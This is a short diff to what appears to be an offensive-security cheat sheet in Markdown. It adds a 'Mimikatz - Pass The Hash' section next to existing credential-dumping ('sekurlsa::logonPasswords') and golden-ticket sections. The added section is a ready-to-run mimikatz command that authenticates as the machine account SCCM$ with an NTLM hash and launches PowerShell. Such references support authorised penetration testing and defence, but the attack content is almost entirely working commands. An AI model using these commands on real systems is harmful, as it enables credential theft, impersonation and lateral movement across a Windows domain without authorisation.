@@ -80,6 +80,12 @@ Switch to minidump
 mimikatz # sekurlsa::logonPasswords
 ```
 
+## Mimikatz - Pass The Hash
+
+```powershell
+mimikatz # sekurlsa::pth /user:SCCM$ /domain:IDENTITY /ntlm:e722dfcd077a2b0bbe154a1b42872f4e /run:powershell
+```
+
 ## Mimikatz - Golden ticket
 
 ```powershell
